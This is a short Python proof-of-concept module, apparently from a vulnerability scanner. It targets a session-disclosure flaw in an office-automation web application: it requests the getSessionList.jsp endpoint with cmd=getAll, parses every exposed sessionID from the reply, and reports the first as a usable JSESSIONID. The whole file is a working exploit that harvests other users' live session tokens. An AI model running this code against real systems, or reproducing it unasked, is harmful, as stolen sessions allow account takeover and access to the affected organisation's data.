from bs4 import BeautifulSoup

from poc import core


def get_sessionlist(url):
    name = "getSessionList.jsp session disclosure"
    core.start_echo(name)
    path = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
    response = core.get(url, path)
    if response is None or response.status_code != 200 or "<sessionID>" not in response.text:
        core.end_echo(name)
        return

    soup = BeautifulSoup(response.text, "lxml")
    sessions = [
        node.string.strip("\n\r")
        for node in soup.find_all("sessionid")
        if node.string and node.string.strip("\n\r")
    ]
    if not sessions:
        core.end_echo(name)
        return
    core.result(name, url + path, "JSESSIONID=" + sessions[0])
    print(f"[#] session records captured: {len(sessions)}")
    core.end_echo(name, "sensitive session evidence")
